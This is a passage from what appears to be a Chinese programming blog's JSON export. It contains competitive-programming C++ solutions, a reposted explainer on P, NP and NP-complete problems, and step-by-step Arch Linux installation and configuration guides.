12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;cmath&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;char buf[1 &lt;&lt; 14], *p1 = buf, *p2 = buf;inline char gc() &#123; return p1 == p2 &amp;&amp; (p2 = (p1 = buf) + fread(buf, 1, 1 &lt;&lt; 14, stdin), p1 == p2) ? EOF : *p1++;&#125;inline int read() &#123; int x = 0, f = 1; char c = gc(); for (; !isdigit(c); c = gc()) if (c == &#x27;-&#x27;) f = -1; for (; isdigit(c); c = gc()) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;const int N = 5005;double p[N], f[N][N];int t[N];int main() &#123; int n = read(), T = read(); for (int i = 1; i &lt;= n; i++) &#123; p[i] = 1.0 * read() / 100; t[i] = read(); &#125; double ans = 0; f[0][0] = 1; for (int i = 1; i &lt;= n; i++) &#123; double sum = 0; double lst = pow(1 - p[i], t[i] - 1); for (int j = 1; j &lt;= T; j++) &#123; sum *= 1 - p[i]; sum += f[i - 1][j - 1] * p[i]; if (j &gt;= t[i]) &#123; sum -= f[i - 1][j - t[i]] * lst * p[i]; f[i][j] += f[i - 1][j - t[i]] * lst; &#125; f[i][j] += sum; ans += f[i][j]; &#125; &#125; printf(&quot;%.9lf&quot;, ans);&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"CodeForces","slug":"OI/CodeForces","permalink":"https://sxyugao.top/categories/OI/CodeForces/"}],"tags":[{"name":"DP","slug":"DP","permalink":"https://sxyugao.top/tags/DP/"},{"name":"概率期望","slug":"概率期望","permalink":"https://sxyugao.top/tags/%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B/"}]},{"title":"什么是P问题、NP问题和NPC问题","slug":"什么是P问题、NP问题和NPC问题","date":"2019-10-06T12:05:16.000Z","updated":"2022-01-07T13:57:23.227Z","comments":true,"path":"p/d4fb227c.html","permalink":"https://sxyugao.top/p/d4fb227c.html","excerpt":"为了准备初赛，发现自己对P问题、NP问题和NPC问题一点都不熟悉，在网上找到了 Matrix67 大佬的博文，感觉很棒，所以转载一下。 其实是太久没写博文了来充数的 原文链接 遵循署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议 以下为原文，对公式略加修改，删改了逻辑电路部分内容，并且重绘了逻辑电路图（原文排版实在难以看清）。","text":"为了准备初赛，发现自己对P问题、NP问题和NPC问题一点都不熟悉，在网上找到了 Matrix67 大佬的博文，感觉很棒，所以转载一下。 其实是太久没写博文了来充数的 原文链接 遵循署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议 以下为原文，对公式略加修改，删改了逻辑电路部分内容，并且重绘了逻辑电路图（原文排版实在难以看清）。 这或许是众多OIer最大的误区之一。 你会经常看到网上出现“这怎么做，这不是NP问题吗”、“这个只有搜了，这已经被证明是NP问题了”之类的话。你要知道，大多数人此时所说的NP问题其实都是指的NPC问题。他们没有搞清楚NP问题和NPC问题的概念。NP问题并不是那种“只有搜才行”的问题，NPC问题才是。好，行了，基本上这个误解已经被澄清了。下面的内容都是在讲什么是P问题，什么是NP问题，什么是NPC问题，你如果不是很感兴趣就可以不看了。接下来你可以看到，把NP问题当成是 NPC问题是一个多大的错误。 还是先用几句话简单说明一下时间复杂度。时间复杂度并不是表示一个程序解决问题需要花多少时间，而是当问题规模扩大后，程序需要的时间长度增长得有多快。也就是说，对于高速处理数据的计算机来说，处理某一个特定数据的效率不能衡量一个程序的好坏，而应该看当这个数据的规模变大到数百倍后，程序运行时间是否还是一样，或者也跟着慢了数百倍，或者变慢了数万倍。不管数据有多大，程序处理花的时间始终是那么多的，我们就说这个程序很好，具有 $O(1)$ 的时间复杂度，也称常数级复杂度；数据规模变得有多大，花的时间也跟着变得有多长，这个程序的时间复杂度就是 $O(n)$，比如找 $n$ 个数中的最大值；而像冒泡排序、插入排序等，数据扩大2倍，时间变慢4倍的，属于 $O(n^2)$ 的复杂度。还有一些穷举类的算法，所需时间长度成几何阶数上涨，这就是 $O(a^n)$ 的指数级复杂度，甚至 $O(n!)$ 的阶乘级复杂度。不会存在 $O(2 \\times n^2)$ 的复杂度，因为前面的那个“2”是系数，根本不会影响到整个程序的时间增长。同样地，$O(n^3+n^2)$ 的复杂度也就是 $O(n^3)$ 的复杂度。因此，我们会说，一个 $O(0.01 \\times n^3)$ 的程序的效率比 $O(100 \\times n^2)$ 的效率低，尽管在 $n$ 很小的时候，前者优于后者，但后者时间随数据规模增长得慢，最终 $O(n^3)$ 的复杂度将远远超过 $O(n^2)$。我们也说，$O(n^{100})$ 的复杂度小于 $O(1.01^n)$ 的复杂度。 容易看出，前面的几类复杂度被分为两种级别，其中后者的复杂度无论如何都远远大于前者：一种是 $O(1)$, $O(log(n))$, $O(n^a)$ 等，我们把它叫做多项式级的复杂度，因为它的规模 $n$ 出现在底数的位置；另一种是 $O(a^n)$ 和 $O(n!)$ 型复杂度，它是非多项式级的，其复杂度计算机往往不能承受。当我们在解决一个问题时，我们选择的算法通常都需要是多项式级的复杂度，非多项式级的复杂度需要的时间太多，往往会超时，除非是数据规模非常小。 自然地，人们会想到一个问题：会不会所有的问题都可以找到复杂度为多项式级的算法呢？很遗憾，答案是否定的。有些问题甚至根本不可能找到一个正确的算法来，这称之为“不可解问题”(Undecidable Decision Problem)。The Halting Problem就是一个著名的不可解问题，在我的 Blog 上有过专门的介绍和证明。再比如，输出从 $1$ 到 $n$ 这 $n$ 个数的全排列。不管你用什么方法，你的复杂度都是阶乘级，因为你总得用阶乘级的时间打印出结果来。有人说，这样的“问题”不是一个“正规”的问题，正规的问题是让程序解决一个问题，输出一个“YES”或“NO”（这被称为判定性问题），或者一个什么什么的最优值（这被称为最优化问题）。那么，根据这个定义，我也能举出一个不大可能会有多项式级算法的问题来：Hamilton回路。问题是这样的：给你一个图，问你能否找到一条经过每个顶点一次且恰好一次（不遗漏也不重复）最后又走回来的路（满足这个条件的路径叫做Hamilton回路）。这个问题现在还没有找到多项式级的算法。事实上，这个问题就是我们后面要说的NPC问题。 下面引入P类问题的概念：如果一个问题可以找到一个能在多项式的时间里解决它的算法，那么这个问题就属于P问题。P是英文单词多项式的第一个字母。哪些问题是P类问题呢？通常 NOI 和 NOIP 不会出不属于P类问题的题目。我们常见到的一些信息奥赛的题目都是P问题。道理很简单，一个用穷举换来的非多项式级时间的超时程序不会涵盖任何有价值的算法。 接下来引入NP问题的概念。这个就有点难理解了，或者说容易理解错误。在这里强调（回到我竭力想澄清的误区上），NP问题不是非P类问题。NP问题是指可以在多项式的时间里验证一个解的问题。NP问题的另一个定义是，可以在多项式的时间里猜出一个解的问题。比方说，我RP很好，在程序中需要枚举时，我可以一猜一个准。现在某人拿到了一个求最短路径的问题，问从起点到终点是否有一条小于100个单位长度的路线。它根据数据画好了图，但怎么也算不出来，于是来问我：你看怎么选条路走得最少？我说，我RP很好，肯定能随便给你指条很短的路出来。然后我就胡乱画了几条线，说就这条吧。那人按我指的这条把权值加起来一看，嘿，神了，路径长度98，比100小。于是答案出来了，存在比100小的路径。别人会问他这题怎么做出来的，他就可以说，因为我找到了一个比100小的解。在这个题中，找一个解很困难，但验证一个解很容易。验证一个解只需要 $O(n)$ 的时间复杂度，也就是说我可以花 $O(n)$ 的时间把我猜的路径的长度加出来。那么，只要我RP好，猜得准，我一定能在多项式的时间里解决这个问题。我猜到的方案总是最优的，不满足题意的方案也不会来骗我去选它。这就是NP问题。当然有不是NP问题的问题，即你猜到了解但是没用，因为你不能在多项式的时间里去验证它。下面我要举的例子是一个经典的例子，它指出了一个目前还没有办法在多项式的时间里验证一个解的问题。很显然，前面所说的Hamilton回路是NP问题，因为验证一条路是否恰好经过了每一个顶点非常容易。但我要把问题换成这样：试问一个图中是否不存在Hamilton回路。这样问题就没法在多项式的时间里进行验证了，因为除非你试过所有的路，否则你不敢断定它“没有Hamilton回路”。 之所以要定义NP问题，是因为通常只有NP问题才可能找到多项式的算法。我们不会指望一个连多项式地验证一个解都不行的问题存在一个解决它的多项式级的算法。相信读者很快明白，信息学中的号称最困难的问题——“NP问题”，实际上是在探讨NP问题与P类问题的关系。 很显然，所有的P类问题都是NP问题。也就是说，能多项式地解决一个问题，必然能多项式地验证一个问题的解——既然正解都出来了，验证任意给定的解也只需要比较一下就可以了。关键是，人们想知道，是否所有的NP问题都是P类问题。我们可以再用集合的观点来说明。如果把所有P类问题归为一个集合P中，把所有 NP问题划进另一个集合NP中，那么，显然有P属于NP。现在，所有对NP问题的研究都集中在一个问题上，即究竟是否有P=NP？通常所谓的“NP问题”，其实就一句话：证明或推翻P=NP。 NP问题一直都是信息学的巅峰。巅峰，意即很引人注目但难以解决。在信息学研究中，这是一个耗费了很多时间和精力也没有解决的终极问题，好比物理学中的大统一和数学中的歌德巴赫猜想等。 目前为止这个问题还“啃不动”。但是，一个总的趋势、一个大方向是有的。人们普遍认为，P=NP不成立，也就是说，多数人相信，存在至少一个不可能有多项式级复杂度的算法的NP问题。人们如此坚信P≠NP是有原因的，就是在研究NP问题的过程中找出了一类非常特殊的NP问题叫做NP-完全问题，也即所谓的 NPC问题。C是英文单词“完全”的第一个字母。正是NPC问题的存在，使人们相信P≠NP。下文将花大量篇幅介绍NPC问题，你从中可以体会到NPC问题使P=NP变得多么不可思议。 为了说明NPC问题，我们先引入一个概念——约化(Reducibility，有的资料上叫“归约”)。 简单地说，一个问题A可以约化为问题B的含义即是，可以用问题B的解法解决问题A，或者说，问题A可以“变成”问题B。《算法导论》上举了这么一个例子。比如说，现在有两个问题：求解一个一元一次方程和求解一个一元二次方程。那么我们说，前者可以约化为后者，意即知道如何解一个一元二次方程那么一定能解出一元一次方程。我们可以写出两个程序分别对应两个问题，那么我们能找到一个“规则”，按照这个规则把解一元一次方程程序的输入数据变一下，用在解一元二次方程的程序上，两个程序总能得到一样的结果。这个规则即是：两个方程的对应项系数不变，一元二次方程的二次项系数为0。按照这个规则把前一个问题转换成后一个问题，两个问题就等价了。同样地，我们可以说，Hamilton回路可以约化为TSP问题(Travelling Salesman Problem，旅行商问题)：在Hamilton回路问题中，两点相连即这两点距离为0，两点不直接相连则令其距离为1，于是问题转化为在TSP问题中，是否存在一条长为0的路径。Hamilton回路存在当且仅当TSP问题中存在长为0的回路。 “问题A可约化为问题B”有一个重要的直观意义：B的时间复杂度高于或者等于A的时间复杂度。也就是说，问题A不比问题B难。这很容易理解。既然问题A能用问题B来解决，倘若B的时间复杂度比A的时间复杂度还低了，那A的算法就可以改进为B的算法，两者的时间复杂度还是相同。正如解一元二次方程比解一元一次方程难，因为解决前者的方法可以用来解决后者。 很显然，约化具有一项重要的性质：约化具有传递性。如果问题A可约化为问题B，问题B可约化为问题C，则问题A一定可约化为问题C。这个道理非常简单，就不必阐述了。 现在再来说一下约化的标准概念就不难理解了：如果能找到这样一个变化法则，对任意一个程序A的输入，都能按这个法则变换成程序B的输入，使两程序的输出相同，那么我们说，问题A可约化为问题B。 当然，我们所说的“可约化”是指的可“多项式地”约化(Polynomial-time Reducible)，即变换输入的方法是能在多项式的时间里完成的。约化的过程只有用多项式的时间完成才有意义。 好了，从约化的定义中我们看到，一个问题约化为另一个问题，时间复杂度增加了，问题的应用范围也增大了。通过对某些问题的不断约化，我们能够不断寻找复杂度更高，但应用范围更广的算法来代替复杂度虽然低，但只能用于很小的一类问题的算法。再回想前面讲的P和NP问题，联想起约化的传递性，自然地，我们会想问，如果不断地约化上去，不断找到能“通吃”若干小NP问题的一个稍复杂的大NP问题，那么最后是否有可能找到一个时间复杂度最高，并且能“通吃”所有的 NP问题的这样一个超级NP问题？答案居然是肯定的。也就是说，存在这样一个NP问题，所有的NP问题都可以约化成它。换句话说，只要解决了这个问题，那么所有的NP问题都解决了。这种问题的存在难以置信，并且更加不可思议的是，这种问题不只一个，它有很多个，它是一类问题。这一类问题就是传说中的NPC 问题，也就是NP-完全问题。NPC问题的出现使整个NP问题的研究得到了飞跃式的发展。我们有理由相信，NPC问题是最复杂的问题。再次回到全文开头，我们可以看到，人们想表达一个问题不存在多项式的高效算法时应该说它“属于NPC问题”。此时，我的目的终于达到了，我已经把NP问题和NPC问题区别开了。到此为止，本文已经写了近5000字了，我佩服你还能看到这里来，同时也佩服一下自己能写到这里来。 NPC问题的定义非常简单。同时满足下面两个条件的问题就是NPC问题。首先，它得是一个NP问题；然后，所有的NP问题都可以约化到它。证明一个问题是 NPC问题也很简单。先证明它至少是一个NP问题，再证明其中一个已知的NPC问题能约化到它（由约化的传递性，则NPC问题定义的第二条也得以满足；至于第一个NPC问题是怎么来的，下文将介绍），这样就可以说它是NPC问题了。 既然所有的NP问题都能约化成NPC问题，那么只要任意一个NPC问题找到了一个多项式的算法，那么所有的NP问题都能用这个算法解决了，NP也就等于P 了。因此，给NPC找一个多项式算法太不可思议了。因此，前文才说，“正是NPC问题的存在，使人们相信P≠NP”。我们可以就此直观地理解，NPC问题目前没有多项式的有效算法，只能用指数级甚至阶乘级复杂度的搜索。 顺便讲一下NP-Hard问题。NP-Hard问题是这样一种问题，它满足NPC问题定义的第二条但不一定要满足第一条（就是说，NP-Hard问题要比 NPC问题的范围广）。NP-Hard问题同样难以找到多项式的算法，但它不列入我们的研究范围，因为它不一定是NP问题。即使NPC问题发现了多项式级的算法，NP-Hard问题有可能仍然无法得到多项式级的算法。事实上，由于NP-Hard放宽了限定条件，它将有可能比所有的NPC问题的时间复杂度更高从而更难以解决。 不要以为NPC问题是一纸空谈。NPC问题是存在的。确实有这么一个非常具体的问题属于NPC问题。 下文即将介绍逻辑电路问题。这是第一个NPC问题。其它的NPC问题都是由这个问题约化而来的。因此，逻辑电路问题是NPC类问题的“鼻祖”。 逻辑电路问题是指的这样一个问题：给定一个逻辑电路，问是否存在一种输入使输出为True。 什么叫做逻辑电路呢？一个逻辑电路由若干个输入，一个输出，若干“逻辑门”和密密麻麻的线组成。看下面一例，不需要解释你马上就明白了。 在线体验，操作说明自己看网页介绍。 上面这个逻辑电路中，无论输入是什么，输出都是False。我们就说，这个逻辑电路不存在使输出为True的一组输入。 回到上文，给定一个逻辑电路，问是否存在一种输入使输出为True，这即逻辑电路问题。 逻辑电路问题属于NPC问题。这是有严格证明的。它显然属于NP问题，并且可以直接证明所有的NP问题都可以约化到它（不要以为NP问题有无穷多个将给证明造成不可逾越的困难）。证明过程相当复杂，其大概意思是说任意一个NP问题的输入和输出都可以转换成逻辑电路的输入和输出（想想计算机内部也不过是一些 0和1的运算），因此对于一个NP问题来说，问题转化为了求出满足结果为True的一个输入（即一个可行解）。 有了第一个NPC问题后，一大堆NPC问题就出现了，因为再证明一个新的NPC问题只需要将一个已知的NPC问题约化到它就行了。后来，Hamilton 回路成了NPC问题，TSP问题也成了NPC问题。现在被证明是NPC问题的有很多，任何一个找到了多项式算法的话所有的NP问题都可以完美解决了。因此说，正是因为NPC问题的存在，P=NP变得难以置信。P=NP问题还有许多有趣的东西，有待大家自己进一步的挖掘。攀登这个信息学的巅峰是我们这一代的终极目标。现在我们需要做的，至少是不要把概念弄混淆了。 Matrix67原创 转载请注明出处 2006 年 8 月 28 日 / 复杂度","categories":[{"name":"转载","slug":"转载","permalink":"https://sxyugao.top/categories/%E8%BD%AC%E8%BD%BD/"}],"tags":[{"name":"数学","slug":"数学","permalink":"https://sxyugao.top/tags/%E6%95%B0%E5%AD%A6/"}]},{"title":"CF643D - Bearish Fanpages","slug":"CF643D-Bearish-Fanpages","date":"2019-07-08T07:23:20.000Z","updated":"2022-01-07T13:57:23.225Z","comments":true,"path":"p/8feb2e15.html","permalink":"https://sxyugao.top/p/8feb2e15.html","excerpt":"作为一道英文题，我们先解释一下题意。 题面有点长就不解释了，大家自己翻译吧。 首先有一个 Simple 的想法，直接维护啊，变的节点又不多，修改不是 $O(1)$ 的吗？ 然后发现错了。","text":"作为一道英文题，我们先解释一下题意。 题面有点长就不解释了，大家自己翻译吧。 首先有一个 Simple 的想法，直接维护啊，变的节点又不多，修改不是 $O(1)$ 的吗？ 然后发现错了。 我们发现因为 $D_i$ 变了，$E_i$ 也会变！ 考虑遍历所有变更过的节点，此时复杂度上界是 $O(n^2)$，比如菊花树就能随便卡。 但我们发现实际上变更的内容很少，考虑将信息分开维护。 我们将题目中的 $A_i$ 看作 $i$ 的父亲，将 $A_j=i$ 的点都看作 $i$ 的儿子。 对于一个节点，维护 $A_i$，$E_i$，$g_i$，$f_i$。 $A_i$，$E_i$ 定义同题意，$f_i$ 表示它自己和它的儿子对自己的贡献，$g_i$ 表示它儿子中所有 $f_i$ 所组成的集合。 对于全局则维护一个 $ans$，其中元素为 $E_i+\\max\\{g_i\\}$ 和 $E_i+\\min\\{g_i\\}$，这样就能覆盖所有的情况了。 不难发现 $C_i=f_i+E_{A_i}$。 这么分开的好处就是对于操作一，我们发现只会影响到 $A_x$，$A_{A_x}$，$A_{A_{A_x}}$，$y$，$A_y$，$A_{A_y}$ 中维护的信息，其中的操作复杂度均为 $log_n$。 具体细节看代码吧。 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;set&gt;using namespace std;typedef long long LL;inline char _gc() &#123; static char buf[1 &lt;&lt; 14], *p1 = buf, *p2 = buf; return p1 == p2 &amp;&amp; (p2 = (p1 = buf) + fread(buf, 1, 1 &lt;&lt; 14, stdin), p1 == p2) ? EOF : *p1++;&#125;#define gc c = _gc()LL read() &#123; LL x = 0, f = 1; char gc; for (; !isdigit(c); gc) if (c == &#x27;-&#x27;) f = -1; for (; isdigit(c); gc) x = x * 10 + c - &#x27;0&#x27;; return x * f;&#125;#undef gcconst int N = 1e5 + 5;LL A[N], B[N], D[N], E[N], f[N];int tmp[10];multiset&lt;LL&gt; g[N], ans;// 可能会有重复的，开multisetint main() &#123; int n = read(), q = read(); for (int i = 1; i &lt;= n; i++) B[i] = read(), D[i] = 2; for (int i = 1; i &lt;= n; i++) A[i] = read(), D[A[i]]++; for (int i = 1; i &lt;= n; i++) E[i] = B[i] / D[i]; for (int i = 1; i &lt;= n; i++) f[A[i]] += E[i]; for (int i = 1; i &lt;= n; i++) f[i] += E[i] + B[i] % D[i]; for (int i = 1; i &lt;= n; i++) g[A[i]].insert(f[i]); for (int i = 1; i &lt;= n; i++) if (g[i].size()) &#123; ans.insert(E[i] + *g[i].begin()); ans.insert(E[i] + *(--g[i].end())); &#125; while (q--) &#123; int opt = read(); if (opt == 1) &#123; int x = read(), y = read(); if (A[x] == y) continue; // 注意此处，不然会使D[i]出问题 tmp[0] = x, tmp[1] = A[x], tmp[2] = A[A[x]], tmp[3] = A[A[A[x]]]; tmp[4] = y, tmp[5] = A[y], tmp[6] = A[A[y]]; sort(tmp, tmp + 7); for (int i = 0; i &lt; 7; i++) &#123; if (tmp[i] == tmp[i + 1]) continue; // 注意给tmp去重，不去重的话会导致多删除信息 int x = tmp[i]; if (g[x].size()) &#123; ans.erase(ans.find(E[x] + *g[x].begin())); ans.erase(ans.find(E[x] + *(--g[x].end()))); &#125; &#125; // A[x]的E、f变了，A[A[x]]的f变了 // 维护f // A[A[x]] g[A[A[A[x]]]].erase(g[A[A[A[x]]]].find(f[A[A[x]]])); f[A[A[x]]] = f[A[A[x]]] - E[A[x]] + B[A[x]] / (D[A[x]] - 1); g[A[A[A[x]]]].insert(f[A[A[x]]]); // A[x] g[A[A[x]]].erase(g[A[A[x]]].find(f[A[x]])); f[A[x]] = f[A[x]] - E[x] - (E[A[x]] + B[A[x]] % D[A[x]]) + B[A[x]] / (D[A[x]] - 1) + B[A[x]] % (D[A[x]] - 1); g[A[A[x]]].insert(f[A[x]]); // 把x接到y上去 g[A[x]].erase(g[A[x]].find(f[x])); g[y].insert(f[x]); // y的E、f变了，A[y]的f变了 // 维护f // A[y] g[A[A[y]]].erase(g[A[A[y]]].find(f[A[y]])); f[A[y]] = f[A[y]] - E[y] + B[y] / (D[y] + 1); g[A[A[y]]].insert(f[A[y]]); // y g[A[y]].erase(g[A[y]].find(f[y])); f[y] = f[y] - (E[y] + B[y] % D[y]) + B[y] / (D[y] + 1) + B[y] % (D[y] + 1) + E[x]; g[A[y]].insert(f[y]); // 维护E D[A[x]]--, D[y]++; E[A[x]] = B[A[x]] / D[A[x]], E[y] = B[y] / D[y]; for (int i = 0; i &lt; 7; i++) &#123; int x = tmp[i]; if (tmp[i] == tmp[i + 1]) continue; if (g[x].size()) &#123; ans.insert(E[x] + *g[x].begin()); ans.insert(E[x] + *(--g[x].end())); &#125; &#125; A[x] = y; &#125; if (opt == 2) &#123; int x = read(); printf(&quot;%lld\\n&quot;, f[x] + E[A[x]]); &#125; if (opt == 3) printf(&quot;%lld %lld\\n&quot;, *ans.begin(), *(--ans.end())); &#125;&#125;","categories":[{"name":"OI","slug":"OI","permalink":"https://sxyugao.top/categories/OI/"},{"name":"CodeForces","slug":"OI/CodeForces","permalink":"https://sxyugao.top/categories/OI/CodeForces/"}],"tags":[{"name":"STL","slug":"STL","permalink":"https://sxyugao.top/tags/STL/"}]},{"title":"Arch Linux 的配置","slug":"ArchLinux的配置","date":"2019-05-12T14:00:00.000Z","updated":"2022-02-04T11:31:24.808Z","comments":true,"path":"p/7a448387.html","permalink":"https://sxyugao.top/p/7a448387.html","excerpt":"接上文 https://sxyugao.top/p/22002c08.html","text":"接上文 https://sxyugao.top/p/22002c08.html 连接网络 我们首先要连接网络，步骤同上。 新建用户 在这之前所有操作都是以 root 用户的身份进行的，由于 root 的权限过高，日常使用 root 用户是不安全的。Linux 为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。 执行以下命令来创建一个名为 username 的用户（请自行替换 username 为你的用户名）： 12useradd -m -G wheel username# 请自行替换 username 为你的用户名 在这里稍微解释一下各参数的含义： -m：在创建时同时在 /home 目录下创建一个与用户名同名的文件夹，这个目录就是你的家目录啦！家目录有一个别名是 ~，你可以在任何地方使用 ~ 来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点： 只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。 你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。 切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。 有些著名的配置文件比如vim的配置文件 ~/.vimrc，只要根据自己的使用习惯配置一次， 在另一个 Linux 系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。 -G wheel：-G 代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料。后面跟着的 wheel 就是加入的组名，至于为什么要加入这个组，后面会提到。 当然记得为新用户设置一个密码，执行如下命令： 12passwd username# 请自行替换 username 为你的用户名 根据提示输入两次密码就可以了，注意，这是你的用户密码，推荐与之前设置的 root 用户的密码不同。 配置 sudo 我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么如果我们需要执行一些只有 root 用户才能执行的命令（例如修改系统文件、安装软件包）怎么办？当然我们可以通过 su 命令来切换到 root用户执行命令后再返回普通用户。 但是 sudo 为我们提供了一个更快捷的办法，使用 sudo，我们只要在需要 root 权限执行的命令之前加上 sudo 就可以了，例如安装软件包。 sudo本身也是一个软件包，但是已经被包含在 base-devel 软件包组中，所以不必再重新安装，只需配置一下即可。 使用 vim 来打开配置文件： 1vim /etc/sudoers 找到 # %wheel ALL=(ALL)ALL， 去掉之前的注释，保存并退出就可以了。 这里的 %wheel 就是代表 wheel 组，意味着 wheel 组中的所有用户都可以使用 sudo 命令。 当然为了安全使用 sudo 命令还是需要输入当前用户的密码的。 配置好 sudo 以后，我们进行一次重启。 重启以后输入你刚创建的用户名与密码来登录。注意登录后要重新进行联网操作。 安装桌面环境 那么多桌面环境随便挑一个就行，新人推荐 KDE 或者 Gnome。 1sudo pacman -S plasma kde-applications # KDE 1sudo pacman -S sudo pacman -S gnome gnome-tweak-tool # Gnome 当然老手也推荐 i3，就是需要自己配置。 安装显示管理器 显示管理器（Display Manager）基于 X 窗口系统，调用 X 窗口系统来以图形化用户界面登录、显示画面以及切换用户。 这里以笔者使用的 lightdm 为示例。 首先安装本体和 Greeter（Greeter 可以自选）： 1pacman -S lightdm lightdm-webkit2-greeter 然后设置 greeter： 1vim /etc/lightdm/lightdm.conf 找到 greeter-session，将其设置为 lightdm-webkit2-greeter。 保存并退出。 然后启动 lightdm 服务： 1sudo systemctl enable lightdm 重启之后应该就能进入图形化界面了。 接下来是 Linux 下的一些软件推荐，感兴趣的同学可以看看。","categories":[{"name":"极客","slug":"极客","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/"},{"name":"Linux","slug":"极客/Linux","permalink":"https://sxyugao.top/categories/%E6%9E%81%E5%AE%A2/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sxyugao.top/tags/Linux/"}]},{"title":"Arch Linux 的安装","slug":"ArchLinux的安装","date":"2019-05-11T14:00:00.000Z","updated":"2022-02-04T11:31:24.808Z","comments":true,"path":"p/22002c08.html","permalink":"https://sxyugao.top/p/22002c08.html","excerpt":"最近折腾了一下 Arch Linux，写一篇安装教程纪念一下。 环境为 HP Notebook x86_64，UEFI。","text":"最近折腾了一下 Arch Linux，写一篇安装教程纪念一下。 环境为 HP Notebook x86_64，UEFI。 安装介质 前往下载页面，在 China 栏下载镜像 如果你是 Linux 用户推荐使用dd命令写入镜像，Windows 用户可以尝试开源小工具 rufus来制作安装介质。 磁盘空间 保证有一个足够大的空闲分区（或新磁盘）。 启动介质 自行设置启动顺序，相信都能解决的。注意，UEFI 启用安全模式启动可能会导致跳过已经写好的介质，如遇到这个问题请设置为传统模式启动。 然后就进入了 U 盘里的 Arch Linux 了。 联网 Arch Linux 的安装离不开网络。 如果你使用无线网络，使用以下命令来联网： 1wifi-menu 如果是有线网络： 1dhcpcd 然后使用以下命令检查是否设置成功： 1ping baidu.com 选择镜像源 默认读者已经了解 Vim 基本操作。 这里我们选择使用速度最快的清华源（当然你也可以选择其他的）。 通过 Vim 打开 /etc/pacman.d/mirrorlist，在列表最上方写入 https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch，保存并退出。 格式化分区 暂时默认已经存在引导分区。 先使用 fdisk -l 查看当前分区情况。 然后将你需要的安装的分区格式化为 ext4 格式： 12mkfs.ext4 /dev/sdxY# 请将的sdxY替换为需要的分区 挂载分区 执行以下命令挂载根分区： 12mount /dev/sdaxY /mnt # 请将sdxY替换为之前的根分区 挂载引导分区： 123mkdir /mnt/bootmount /dev/sdxY /mnt/boot# 请将sdxY替换为之前的引导分区 选择镜像源 默认都会 Vim 的基本操作。 国外镜像源一般会很慢，所以我们要更换源来提升下载速度。 执行以下命令，用 Vim 来编辑 /etc/pacman.d/mirrorlist 这个文件。 1vim /etc/pacman.d/mirrorlist 在最上方加入（二选一即可）： 1234Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch# 清华源Server = http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch# 浙大源 保存并退出。 安装基本包 下面就要安装最基本的 ArchLinux 包到磁盘上了。 执行以下命令： 1pacstrap /mnt linux linux-firmware dhcpcd base base-devel ::warning 注意，这步要保证你的 Arch 镜像为最新，否则可能会报错。 :: 可能需要一定的时间，需要耐心等待。 配置 Fstab 生成自动挂载分区的 fstab 文件，执行以下命令： 1genfstab -L /mnt &gt;&gt; /mnt/etc/fstab Chroot Chroot 意为 Change root，执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行。 执行如下命令： 1arch-chroot /mnt 设置时区 依次执行如下命令设置我们的时区为上海并生成相关文件： 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 提前安装必须软件包 执行如下命令： 1pacman -S vim dialog wpa_supplicant dhcpcd netctl 其中 dialog wpa_supplicant dhcpcd netctl 都是用来连接网络的。 设置 Locale 设置我们使用的语言选项，执行如下命令来编辑 /etc/locale.gen 文件： 1vim /etc/locale.gen 在文件中找到zh_CN.UTF-8 UTF-8 en_US.UTF-8 UTF-8 这两行，去掉注释，保存并退出。 然后执行： 1locale-gen 打开（不存在时会创建）/etc/locale.conf 文件： 1vim /etc/locale.conf 在文件的第一行加入 LANG=en_US.UTF-8，保存并退出。 设置主机名 打开（不存在时会创建）/etc/hostname 文件： 1vim /etc/hostname 在文件的第一行输入你自己设定的一个 hostname，保存并退出。 编辑 /etc/hosts 文件： 1vim /etc/hosts 在文件末添加如下内容： 12127.0.0.1 localhost::1 localhost 保存并退出。 设置 root 密码 root 是 Linux 中具有最高权限帐户，有些敏感的操作必须通过 root 用户进行。正是因为 root 的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为 root 帐户设置一个密码： 执行如下命令： 1passwd 按提示设置并确认就可以了。 安装 Intel-ucode（非IntelCPU可以跳过此步骤） 1pacman -S intel-ucode 安装 Bootloader 首先安装 os-prober、ntfs-3g、grub 与 efibootmgr 这几个包。 os-prober 和 ntfs-3g 可以配合 grub 检测已经存在的系统，自动设置启动选项。 1pacman -S os-prober ntfs-3g grub efibootmgr 部署grub： 12grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grubgrub-mkconfig -o /boot/grub/grub.cfg 重启 执行 exit 来回到 U 盘里的系统。 卸载 /mnt 和 /mnt/boot，然后重启： 123umount /mnt/bootumount /mntreboot 后记 本文参考了吴迪的Blog，进行了部分删减。 基本的配置请移步 